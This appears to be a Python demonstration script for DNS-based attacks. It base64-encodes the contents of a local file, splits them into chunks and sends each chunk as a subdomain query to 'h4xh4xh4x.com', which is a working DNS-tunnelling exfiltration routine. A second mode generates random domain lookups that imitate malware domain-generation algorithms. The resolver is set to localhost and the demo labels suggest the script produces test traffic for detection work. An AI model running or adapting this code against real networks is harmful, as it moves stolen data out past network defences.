
import base64 
import socket
import dns.resolver
import random
import string

def randStr(chars = string.ascii_lowercase, N=10):
	return ''.join(random.choice(chars) for _ in range(N))


resolver = dns.resolver.Resolver(configure=False)
resolver.nameservers = ['127.0.0.1']
resolver.timeout = 1
resolver.lifetime = 1



DOMAIN = "." + "h4xh4xh4x.com"
DEMO = "DGA" #Set to TUNNEL or DGA


data = open('data.txt', 'rb') #open binary file in read mode
data_read = data.read()
encodedBytes = base64.b64encode(data_read)
encodedStr = str(encodedBytes, "utf-8") #converts Base64 to string from bytes

parse = [encodedStr[i:i+48] for i in range(0, len(encodedStr), 48)] #breaks the base64 text file into 48 character chunks and passes to parse

ctr = 0
for dnsquery in parse:
    if DEMO == "TUNNEL":
        try:
            answer = resolver.query(parse[ctr]+DOMAIN, "A")
            print(answer) #query DNS Domain
        except (dns.resolver.NoAnswer):
            print("Couldn't find any records (NoAnswer): "+ parse[ctr]+DOMAIN, "A") #Error handling on Timeout
        except (dns.resolver.NXDOMAIN):
            print("Couldn't find any records (NXDOMAIN): " + parse[ctr]+DOMAIN) #Error handling if DNS is cached on host and cant find.
        except (dns.resolver.Timeout):
            print("DNS Time out")

         
    elif DEMO == "DGA":
        try:
            answer = resolver.query(randStr(N=3) + "." + randStr(N=10) + ".com", "A")
            print(answer)
        except (dns.resolver.NoAnswer): 
            print("Couldn't find any records (NoAnswer): "+ randStr(N=3) + "." + randStr(N=10) + ".com", "A")
        except (dns.resolver.NXDOMAIN):
            print("Couldn't find any records (NXDOMAIN): " + randStr(N=3) + "." + randStr(N=10) + ".com", "A")
        except (dns.resolver.Timeout):
            print("DNS Time out")
    ctr = ctr + 1